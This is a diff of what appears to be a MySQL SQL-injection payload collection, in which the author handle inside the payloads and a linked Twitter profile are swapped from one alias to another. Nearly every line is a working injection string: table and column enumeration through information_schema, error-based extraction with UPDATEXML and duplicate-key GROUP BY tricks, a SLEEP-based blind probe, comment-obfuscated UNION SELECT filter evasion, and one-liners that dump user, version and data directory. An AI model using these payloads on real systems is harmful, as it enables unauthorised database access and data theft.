@@ -185,11 +185,11 @@
  SELECT RPAD(table_name,50,'.') from information_schema.tables where table_schema sounds like database()
  select upper(reverse(right(reverse(table_name),100)))from information_schema.tables where table_schema sounds like database()
  Select unhex(hex(reverse(reverse(elt(1, table_Name))))) from information_schema.tables
- SELECT CASE WHEN (1=1) THEN table_name ELSE '<a href=https://twitter.com/_Y000_>_Y00!_</a>' END from information_schema.tables
- SELECT CASE 4 WHEN 1 THEN database() WHEN 2 THEN @@version WHEN 3 THEN table_name ELSE '_Y000!_' END FROM information_schema.tables
- SELECT CASE WHEN 1>0 THEN table_name ELSE '_Y000!_' END FROM information_schema.tables
- SELECT IF(STRCMP('1','1'),'_Y000!_',table_name) FROM information_schema.tables
- select IF(MID(@@version,1,1)='5',table_name,'_Y000!_') from information_schema.tables
+ SELECT CASE WHEN (1=1) THEN table_name ELSE '<a href=https://twitter.com/_DK4TRIN_>_Y00!_</a>' END from information_schema.tables
+ SELECT CASE 4 WHEN 1 THEN database() WHEN 2 THEN @@version WHEN 3 THEN table_name ELSE '_DK4TRIN!_' END FROM information_schema.tables
+ SELECT CASE WHEN 1>0 THEN table_name ELSE '_DK4TRIN!_' END FROM information_schema.tables
+ SELECT IF(STRCMP('1','1'),'_DK4TRIN!_',table_name) FROM information_schema.tables
+ select IF(MID(@@version,1,1)='5',table_name,'_DK4TRIN!_') from information_schema.tables
  SELECT IFNULL(1+1/0,table_name) FROM information_schema.tables
  SELECT NULLIF(table_name,2) from information_schema.tables
  select upper(reverse(right(reverse(table_name),100)))from information_schema.tables where table_schema sounds like database()
@@ -203,25 +203,25 @@
  select json_array(current_user())
  select json_objectagg(1, @@datadir)
  select json_arrayagg('DK4TRIN')
- select json_arrayagg(concat(JSON_OBJECT(concat(JSON_OBJECT(concat(current_user()), concat(@@version))), '_Y000!_')))
+ select json_arrayagg(concat(JSON_OBJECT(concat(JSON_OBJECT(concat(current_user()), concat(@@version))), '_DK4TRIN!_')))
  SELECT * FROM  information_schema.tables WHERE `table_name` REGEXP 'admin'
  SELECT IF(IFNULL(1/0,'a'),'NO',JSON_OBJECT(1, concat(table_name))) FROM  information_schema.tables WHERE `table_name` REGEXP 'admin'
  select UPDATEXML(1,CONCAT('.',1,(SELECT (ELT(1=1,2))),3),1)
  select UNHEX(HEX(lpad(table_name,50,'>'))) from information_schema.tables
- SELECT TRIM(UpdateXML(table_name, '_Y000_', '1111')) FROM information_schema.tables
+ SELECT TRIM(UpdateXML(table_name, 'DK4TRIN', '1111')) FROM information_schema.tables
  select IF(IFNULL(0,'a'),'NO es nulo',JSON_OBJECT(1, concat(table_name))) FROM  information_schema.tables
  Select if(substring(@@version,'1','1') = "5", 'si', 'no')
  Select Unhex(hex(WEIGHT_STRING(table_name))) as 'tables' from information_schema.tables where table_name regexp '^[a | b]'
  select UNHEX(HEX(lpad(table_name,50,'>'))) from information_schema.tables
  select UPDATEXML(1,CONCAT('.',1,(SELECT (ELT(1=1,2))),3),1)
- SELECT TRIM(UpdateXML(table_name, '_Y000_', '1111')) FROM information_schema.tables
+ SELECT TRIM(UpdateXML(table_name, 'DK4TRIN', '1111')) FROM information_schema.tables
  SELECT version() FROM (SELECT(SLEEP(5))) a
  SELECT * FROM(SELECT COUNT(*),CONCAT(database(),'--',(SELECT (ELT(1=1,version()))),'--','DK4TRIN',FLOOR(RAND(1)*1))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x) a
  SELECT TRIM(UpdateXML(CONCAT('.',database(),'--',(SELECT (ELT(1=1,@@version))),concat('--',@@datadir)), 'DK4TRIN', '1111'))
- SELECT * FROM (SELECT count(*), CONCAT((select json_arrayagg(concat(JSON_OBJECT(concat(JSON_OBJECT(concat(current_user()), concat(@@version))), '_Y000!_')))), 0x23, FLOOR(RAND(0)*1)) AS x FROM information_schema.columns GROUP BY x) y
+ SELECT * FROM (SELECT count(*), CONCAT((select json_arrayagg(concat(JSON_OBJECT(concat(JSON_OBJECT(concat(current_user()), concat(@@version))), '_DK4TRIN!_')))), 0x23, FLOOR(RAND(0)*1)) AS x FROM information_schema.columns GROUP BY x) y
  Select if(now()=sysdate(),(select table_name),0) from information_schema.tables
  select json_arrayagg(concat(JSON_OBJECT(concat(JSON_OBJECT(concat(current_user()), concat(@@version))), 'DK4TRIN')))
- SELECT 0 FROM (SELECT count(*), CONCAT((SELECT @@version), 0x23, FLOOR(RAND(0)*4)) AS Y000 FROM information_schema.tables GROUP BY Y000) x
+ SELECT 0 FROM (SELECT count(*), CONCAT((SELECT @@version), 0x23, FLOOR(RAND(0)*4)) AS DK4TRIN FROM information_schema.tables GROUP BY DK4TRIN) x
 /*!u%6eion*/ /*!se%6cect*/+1,concat(@:=0,(select count(*)from information_schema.columns where@:=concat(@,'<br>',table_name,'::',column_name)),@),3..
 (select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema=database())and(0x00)in(@x:=concat+(@x,0x3c62723e,table_name,0x203a3a20,column_name))))x)
  CONCAT(Tablas <br>,(SELECT(@x)FROM(SELECT(@x:=0x00),(@NR:=0),(SELECT(0)FROM(INFORMATION_SCHEMA.TABLES)WHERE(TABLE_SCHEMA!=information_schema)AND(0x00)IN(@x:=CONCAT(@x,LPAD(@NR:=@NR%2b1,2,0x30),0x3a20,table_name,0x3c62723e))))x))
